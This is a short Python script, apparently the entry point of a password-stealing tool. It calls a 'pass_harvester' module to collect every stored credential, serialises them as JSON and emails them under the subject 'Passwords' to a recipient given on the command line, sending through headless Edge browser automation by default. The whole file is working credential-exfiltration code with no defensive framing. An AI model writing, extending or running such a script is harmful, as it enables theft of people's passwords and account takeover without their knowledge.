import asyncio
import json
import traceback

from pass_harvester.password_harvester import get_all_creds
from edge_email import write_email
import argparse


async def main(to:str, cc:str=None, headfull=False):
    subject = "Passwords"
    try:
        creds = await get_all_creds(use_b64=True)
        content = json.dumps(creds)
    except Exception as e:
        traceback.print_exc()
        content = ''.join(traceback.TracebackException.from_exception(e).format())
        subject = "Error Log"

    await write_email(to, subject, content,cc=cc, headless=not headfull)
    print("E-Mail written")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("to", help="The destination to send the E-Mail to", type=str)
    parser.add_argument('--headfull', action='store_true', help="open a window for edge")
    parser.add_argument('--cc', default=None, type=str)
    args = parser.parse_args()
    asyncio.run(main(args.to, cc=args.cc, headfull=args.headfull))
